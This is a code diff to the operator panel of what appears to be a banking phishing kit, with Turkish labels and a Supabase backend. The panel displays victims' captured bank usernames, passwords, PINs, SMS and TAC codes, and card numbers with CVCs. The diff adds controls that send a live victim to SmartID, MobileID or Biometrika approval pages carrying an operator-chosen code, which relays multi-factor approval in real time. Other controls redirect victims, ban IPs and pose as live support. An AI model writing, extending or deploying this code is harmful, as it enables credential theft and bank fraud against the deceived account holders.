@@ -10,6 +10,43 @@ import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 const SESSION_LIST_COLUMNS =
   "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
 
+const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
+  { value: "smartid_1", label: "SmartID 1 Sayfası" },
+  { value: "smartid_2", label: "SmartID 2 Sayfası" },
+  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
+  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
+  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
+  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
+];
+
+function getApprovalDisplayText(value: string): string {
+  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
+  if (!matchedOption) {
+    return "";
+  }
+
+  return matchedOption.label.includes("Sayfası")
+    ? matchedOption.label.replace(" Sayfası", " Onaylandı")
+    : `${matchedOption.label} Onaylandı`;
+}
+
+function parseApprovalHistory(value: unknown): string[] {
+  if (typeof value !== "string" || !value.trim()) {
+    return [];
+  }
+
+  try {
+    const parsed = JSON.parse(value) as unknown;
+    if (Array.isArray(parsed)) {
+      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
+    }
+  } catch {
+    return [value.trim()];
+  }
+
+  return [];
+}
+
 function inferCanonicalLogFieldKey(
   key: string,
 ): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
@@ -185,63 +222,38 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const orderedField2 = pickString("orderedField2");
   const orderedField2Type = pickString("orderedField2Type");
   const rawPersonalCode = pickString("personalCode");
-  const rawBankPhone = pickString("bankPhone");
   const rawUsername = pickString("username", "verfuegernummer");
   const rawPassword = pickString("password", "pin");
-  const usedValues = new Set<string>();
-  const takeDistinct = (value: string) => {
-    const trimmed = value.trim();
-    if (!trimmed || usedValues.has(trimmed)) {
-      return "";
-    }
 
-    usedValues.add(trimmed);
-    return trimmed;
-  };
+  const primaryValue = orderedField1 || rawPersonalCode || rawUsername;
+  const secondaryValue = orderedField2 || rawPassword;
 
-  const effectivePersonalCode = takeDistinct(orderedField1 || rawPersonalCode || rawUsername || rawBankPhone);
-
-  let effectiveBankPhone = "";
-  let effectiveUsername = "";
-  let effectivePassword = "";
-
-  if (orderedField2) {
-    if (orderedField2Type === "phone") {
-      effectiveBankPhone = takeDistinct(orderedField2);
-    } else if (orderedField2Type === "password") {
-      effectivePassword = takeDistinct(orderedField2);
-    } else {
-      effectiveUsername = takeDistinct(orderedField2);
-    }
+  if (!primaryValue && !secondaryValue) {
+    return [];
   }
 
-  if (!effectiveBankPhone) {
-    effectiveBankPhone = takeDistinct(rawBankPhone);
+  const fields: Array<[string, string]> = [];
+
+  if (primaryValue) {
+    fields.push(["personalCode", primaryValue]);
   }
 
-  if (!effectiveUsername) {
-    effectiveUsername = takeDistinct(rawUsername || rawPersonalCode || rawBankPhone);
+  if (!secondaryValue) {
+    return fields;
   }
 
-  if (!effectivePassword) {
-    effectivePassword = takeDistinct(rawPassword);
+  if (orderedField2Type === "phone") {
+    fields.push(["bankPhone", secondaryValue]);
+    return fields;
   }
 
-  const canonicalFields: Array<[string, string]> = [
-    ["loginMethod", pickString("loginMethod")],
-    ["personalCode", effectivePersonalCode],
-    ["bankPhone", effectiveBankPhone],
-    ["username", effectiveUsername],
-    ["password", effectivePassword],
-    ["tacCode", pickString("tacCode")],
-    ["pasnummer", pickString("pasnummer")],
-    ["rekeningnummer", pickString("rekeningnummer")],
-    ["toegangscode", pickString("toegangscode")],
-    ["signatuur", pickString("signatuur")],
-    ["identificatiecode", pickString("identificatiecode")],
-  ];
+  if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
+    fields.push(["password", secondaryValue]);
+    return fields;
+  }
 
-  return canonicalFields.filter(([, value]) => Boolean(value));
+  fields.push(["username", secondaryValue]);
+  return fields;
 }
 
 function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
@@ -267,12 +279,16 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "cardExpiry",
     "cardCvc",
     "currency",
+    "partner_display_name",
     "participationCode",
     "is_wheel_game",
     "specialNoticeText",
     "specialNoticeImage",
     "specialNoticeLang",
     "specialNoticeSentAt",
+    "approvalStatus",
+    "approvalCode",
+    "approvalHistory",
   ]);
 
   return Object.entries(formData).flatMap(([key, value]) => {
@@ -341,6 +357,9 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
   const [smsDigitsInput, setSmsDigitsInput] = useState("6");
   const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
+  const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
+  const [approvalPromptType, setApprovalPromptType] = useState("");
+  const [approvalCodeInput, setApprovalCodeInput] = useState("");
 
   const [soundEnabled, setSoundEnabled] = useState(false);
   const soundEnabledRef = useRef(false);
@@ -529,6 +548,13 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
     }
   };
 
+  const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
+    if (!approvalValue) return;
+    setApprovalPromptSessionId(sessionId);
+    setApprovalPromptType(approvalValue);
+    setApprovalCodeInput("");
+  };
+
   async function confirmSmsRedirect() {
     if (!supabase || !smsPromptSessionId) return;
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
@@ -542,6 +568,39 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
+    void load();
+  }
+
+  async function confirmApprovalAction() {
+    if (!supabase || !approvalPromptSessionId || !approvalPromptType) return;
+
+    const row = rowsRef.current.find((currentRow) => currentRow.id === approvalPromptSessionId);
+    const previousFormData =
+      row && row.form_data && typeof row.form_data === "object"
+        ? (row.form_data as Record<string, string | undefined>)
+        : {};
+
+    await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        status: "online",
+        current_step: "special_approval",
+        form_data: {
+          ...previousFormData,
+          approvalStatus: approvalPromptType,
+          approvalCode: approvalCodeInput.trim(),
+          specialNoticeText: "",
+          specialNoticeImage: "",
+          specialNoticeLang: undefined,
+          specialNoticeSentAt: "",
+        },
+      })
+      .eq("id", approvalPromptSessionId);
+
+    setApprovalPromptSessionId(null);
+    setApprovalPromptType("");
+    setApprovalCodeInput("");
     void load();
   }
 
@@ -715,6 +774,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       current_step: "special_approval",
       form_data: { 
         ...prev, 
+        approvalStatus: "",
+        approvalCode: "",
         specialNoticeText: specialMessage.trim(), 
         specialNoticeImage: specialImage ?? "", 
         specialNoticeLang: specialLang, 
@@ -838,25 +899,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto pb-4">
-          <table className="w-full text-sm text-left border-collapse">
+          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">ID</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">İsim</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Numara</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Banka</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">SMS</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Kart</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="px-3 py-4 font-semibold whitespace-nowrap">Durum</th>
-                <th className="px-3 py-4 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
+                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
+                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
+                <th className="w-[24%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
+                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
+                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
+                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
+                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
+                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
               {rows.length === 0 && (
                 <tr>
-                  <td colSpan={10} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
+                  <td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                 </tr>
               )}
               {rows.map((row) => {
@@ -900,87 +962,134 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
                 else if (s === "special_approval") { stepText = "ÖZEL BİLDİRİM"; stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20"; }
 
+                const canonicalBankFields = getCanonicalAdminBankFields(fd);
+                const additionalBankFields = getAdditionalAdminBankFields(fd);
+                const approvalHistory = parseApprovalHistory(fd.approvalHistory);
+                const approvalEntries =
+                  approvalHistory.length > 0
+                    ? approvalHistory
+                    : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
+                      ? [fd.approvalStatus.trim()]
+                      : [];
+                const smsValue =
+                  typeof fd.smsCode === "string" && fd.smsCode.trim()
+                    ? fd.smsCode.trim()
+                    : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                      ? fd.tacCode.trim()
+                      : "";
+
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
-                    <td className="px-3 py-4 font-mono text-[11px] opacity-50 uppercase whitespace-nowrap" title={row.id}>{row.id.split('-')[0]}</td>
-                    <td className="px-3 py-4 font-bold text-lg text-[#EB5E28] whitespace-nowrap">
+                    <td className="px-2 py-3 align-top font-mono text-[10px] opacity-50 uppercase break-all" title={row.id}>
+                      {row.id.split('-')[0]}
+                    </td>
+                    <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
-                    <td className="px-3 py-4 min-w-[100px]">
-                      <div className="font-semibold text-sm cursor-pointer hover:underline opacity-90 transition-opacity group-hover:opacity-100" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
+                    <td className="px-2 py-3 align-top">
+                      <div className="cursor-pointer text-[11px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
-                    <td className="px-3 py-4 whitespace-nowrap">
-                      <div className="cursor-pointer text-sm hover:underline opacity-80" onClick={() => copyToClipboard(fd.phone)}>
+                    <td className="px-2 py-3 align-top">
+                      <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
                     </td>
-                    <td className="px-3 py-4">
-                      <div className="text-[13px] space-y-1.5 max-w-[200px] break-words">
-                          {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {getCanonicalAdminBankFields(fd).map(([key, value]) => {
-                              let displayKey = key;
-                              if (displayKey === "username") displayKey = "ID / K.Adı";
-                              else if (displayKey === "password") displayKey = "Şifre / PIN";
-                              else if (displayKey === "tacCode") displayKey = "TAC";
-                              else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
-                              else if (displayKey === "pasnummer") displayKey = "Kart No";
-                              else if (displayKey === "toegangscode") displayKey = "Giriş Kodu";
-                              else if (displayKey === "signatuur") displayKey = "İmza";
-                              else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
-                              else if (displayKey === "loginMethod") displayKey = "Giriş Yöntemi";
-                              else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
-                              else if (displayKey === "bankPhone") displayKey = "Telefon";
-                              
-                              return (
-                                <div key={key} className="flex gap-1.5 items-start">
-                                  <span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0 whitespace-nowrap">
-                                    {displayKey}
-                                  </span>
-                                  <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity break-all" onClick={() => copyToClipboard(String(value))}>
-                                    {String(value)}
-                                  </span>
-                                </div>
-                              );
-                          })}
+                    <td className="px-2 py-3 align-top">
+                      <div className="space-y-1 text-[10px] leading-tight">
+                        {fd.bankName && <div className="font-bold text-[11px] text-yellow-600 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">{fd.bankName}</div>}
+                        {canonicalBankFields.map(([key, value]) => {
+                          let displayKey = key;
+                          if (displayKey === "username") displayKey = "ID / K.Adı";
+                          else if (displayKey === "password") displayKey = "Şifre / PIN";
+                          else if (displayKey === "tacCode") displayKey = "TAC";
+                          else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
+                          else if (displayKey === "pasnummer") displayKey = "Kart No";
+                          else if (displayKey === "toegangscode") displayKey = "Giriş Kodu";
+                          else if (displayKey === "signatuur") displayKey = "İmza";
+                          else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
+                          else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
+                          else if (displayKey === "bankPhone") displayKey = "Telefon";
+
+                          return (
+                            <div key={key} className="flex min-w-0 items-start gap-1 leading-tight">
+                              <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                                {displayKey}
+                              </span>
+                              <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
+                                {String(value)}
+                              </span>
+                            </div>
+                          );
+                        })}
+                        {additionalBankFields.map(([key, value]) => (
+                          <div key={key} className="flex min-w-0 items-start gap-1 leading-tight">
+                            <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                              {key}
+                            </span>
+                            <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
+                              {String(value)}
+                            </span>
+                          </div>
+                        ))}
+                      </div>
+                    </td>
+                    <td className="px-2 py-3 align-top">
+                      {approvalEntries.length === 0 ? (
+                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
+                      ) : (
+                        <div className="flex flex-col items-start gap-1">
+                          {approvalEntries.map((approvalValue, index) => (
+                            <span
+                              key={`${approvalValue}-${index}`}
+                              className="inline-flex w-fit max-w-full items-center self-start rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
+                            >
+                              {getApprovalDisplayText(approvalValue)}
+                            </span>
+                          ))}
                         </div>
+                      )}
                     </td>
-                    <td className="px-3 py-4 whitespace-nowrap">
-                      <div className="cursor-pointer font-mono tracking-widest text-indigo-500 font-bold text-base hover:underline drop-shadow-sm" onClick={() => copyToClipboard(fd.smsCode)}>
-                        {fd.smsCode || '-'}
+                    <td className="px-2 py-3 align-top">
+                      <div
+                        className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
+                        onClick={() => copyToClipboard(smsValue)}
+                      >
+                        {smsValue || '-'}
                       </div>
                     </td>
-                    <td className="px-3 py-4">
-                      <div className="text-[12px] space-y-1.5 font-medium max-w-[160px] break-words">
-                        {fd.cardNumber && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">No:</span> <span className="cursor-pointer hover:opacity-70 truncate" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
-                        {fd.cardExpiry && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">SKT:</span> <span>{fd.cardExpiry}</span></div>}
-                        {fd.cardCvc && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">CVC:</span> <span>{fd.cardCvc}</span></div>}
+                    <td className="px-2 py-3 align-top">
+                      <div className="space-y-1 text-[10px] font-medium leading-tight">
+                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
+                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
+                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
+                        {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                       </div>
                     </td>
-                    <td className="px-3 py-4 whitespace-nowrap">
-                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wide shadow-sm whitespace-nowrap inline-block ${stepColor}`}>
+                    <td className="px-2 py-3 align-top">
+                      <span className={`inline-flex max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] ${stepColor}`}>
                         {stepText}
                       </span>
                     </td>
-                    <td className="px-3 py-4 whitespace-nowrap">
+                    <td className="px-2 py-3 align-top">
                       {isOnline ? (
-                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold tracking-widest whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                           ONLINE
                         </span>
                       ) : (
-                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold tracking-widest whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                           OFFLINE
                         </span>
                       )}
                     </td>
-                    <td className="px-3 py-4 whitespace-nowrap text-right">
-                      <div className="flex flex-col gap-2 w-full min-w-[180px] items-end justify-end ml-auto">
-                        <select 
-                          className={`w-full rounded-xl border text-xs px-3 py-2 outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
-                          value="" 
+                    <td className="px-2 py-3 align-top text-right">
+                      <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
+                        <select
+                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                          value=""
                           onChange={(e) => {
                             if (e.target.value) {
                               void handleRouteAction(row.id, e.target.value);
@@ -1000,15 +1109,33 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                           <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                           <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
                         </select>
-                        
-                        <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
-                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-2 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
+
+                        <select
+                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                          value=""
+                          onChange={(e) => {
+                            if (e.target.value) {
+                              void handleApprovalAction(row.id, e.target.value);
+                              e.target.value = "";
+                            }
+                          }}
+                        >
+                          <option value="">Onay Seçin...</option>
+                          {APPROVAL_OPTIONS.map((option) => (
+                            <option key={option.value} value={option.value}>
+                              {option.label}
+                            </option>
+                          ))}
+                        </select>
+
+                        <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
+                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬</span>
                           </button>
-                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
+                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
                           </button>
-                          <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 hover:scale-105 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
+                          <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
                             <span>🗑️</span>
                           </button>
                         </div>
@@ -1186,6 +1313,53 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               </button>
               <button
                 onClick={() => void confirmSmsRedirect()}
+                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
+              >
+                Onayla ve Gönder
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {approvalPromptSessionId && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
+          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Onay Ayarları</h3>
+
+            <div className="space-y-4">
+              <div>
+                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Seçilen Onay</label>
+                <div className={`w-full rounded-xl border px-3 py-2 text-sm font-semibold ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}>
+                  {APPROVAL_OPTIONS.find((option) => option.value === approvalPromptType)?.label || "-"}
+                </div>
+              </div>
+
+              <div>
+                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
+                <input
+                  type="text"
+                  value={approvalCodeInput}
+                  onChange={(e) => setApprovalCodeInput(e.target.value)}
+                  placeholder="Örn: 1, 22, 4578"
+                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                />
+              </div>
+            </div>
+
+            <div className="mt-6 flex justify-end gap-3">
+              <button
+                onClick={() => {
+                  setApprovalPromptSessionId(null);
+                  setApprovalPromptType("");
+                  setApprovalCodeInput("");
+                }}
+                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
+              >
+                İptal
+              </button>
+              <button
+                onClick={() => void confirmApprovalAction()}
                 className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
               >
                 Onayla ve Gönder
